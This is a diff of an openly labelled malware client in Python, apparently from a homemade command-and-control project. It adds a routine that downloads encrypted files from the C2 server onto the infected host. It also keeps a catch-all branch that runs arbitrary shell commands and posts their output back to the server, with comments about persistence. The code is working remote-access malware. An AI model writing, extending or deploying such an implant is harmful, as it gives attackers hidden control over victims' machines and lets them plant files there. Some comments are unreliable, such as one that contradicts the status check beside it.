@@ -6,7 +6,7 @@ from time import sleep, time
 from requests import exceptions, get, post
 from sys import platform
 from encryption import cipher
-from settings import PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+from settings import FILE_REQUEST, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
 
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
@@ -62,6 +62,42 @@ while True:
         else:
             post_to_server(getcwd(), CWD_RESPONSE)
 
+    # If command dosen't start with client, run an OS command and send the output to the c2 server
+    elif not command.startswith("client "):
+        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+        post_to_server(command_output.decode())
+
+    # The "client download FILENAME" command allows is ti transfer files to the client from our c2 server
+    elif command.startswith("client download"):
+
+        # Initialize filename in order to get rid of warning
+        filename = None
+
+        try:
+            # Split out the filepath to download
+            filepath = command.split()[2]
+
+            # Split out the filename from the end of the filepath or if only a filename was supplied, use it
+            filename = filepath.rsplit("/", 1)[-1] or filepath
+
+            # UTF-8 encode the filename first to be able to encrypt it, but then we must decode it after the encryption
+            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
+
+            # Use an HTTP GET request to stream the requested file from the c2 server
+            with get(url=f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
+
+                # If the file was not found, open it up and write it out to disk, then notify us on the server
+                if response.status_code == 200:
+                    with open(filename, "wb") as file_handle:
+                        # Decrypt the response content and write the file out to disk, then notify us on the server
+                        file_handle.write(cipher.decrypt(response.content))
+                    post_to_server(f"{filename} is now on {client}.\n")
+
+        except IndexError:
+            post_to_server("You must enter the filename to dowload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to write {filename} to disk on {client}.\n")
+
     # The "client kill" command will shut down our malware; make sure we have persistance!
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been killed.\n")
@@ -79,8 +115,3 @@ while True:
             post_to_server(f"{client} will sleep for {delay} seconds. \n")
             sleep(delay)
             post_to_server(f"{client} is now awake. \n")
-
-    # Else, run our operating system command and send the output to the c2
-    else:
-        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
-        post_to_server(command_output.decode())
